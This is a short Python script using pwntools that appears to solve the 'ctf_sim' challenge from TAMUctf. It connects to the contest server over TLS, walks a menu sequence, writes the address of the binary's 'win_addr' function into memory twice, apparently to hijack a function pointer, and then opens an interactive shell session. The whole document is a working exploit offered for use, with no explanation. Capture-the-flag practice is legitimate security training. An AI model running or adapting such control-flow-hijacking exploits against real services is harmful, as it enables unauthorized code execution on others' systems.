from pwn import *


e = ELF('./ctf_sim')
win_ptr = e.symbols['win_addr']

p = remote("tamuctf.com", 443, ssl=True, sni="ctf-sim")

p.sendline(b'1')
p.sendline(b'1')
p.sendline(b'0')
p.sendline(b'1')
p.sendline(b'2')
p.sendline(b'1')
p.sendline(b'2')
p.sendline(b'0')

p.sendline(b'3')
p.sendline(b'9')
p.sendline(p64(win_ptr))

p.sendline(b'3')
p.sendline(b'9')
p.sendline(p64(win_ptr))

p.sendline(b'2')
p.sendline(b'0')

p.interactive()
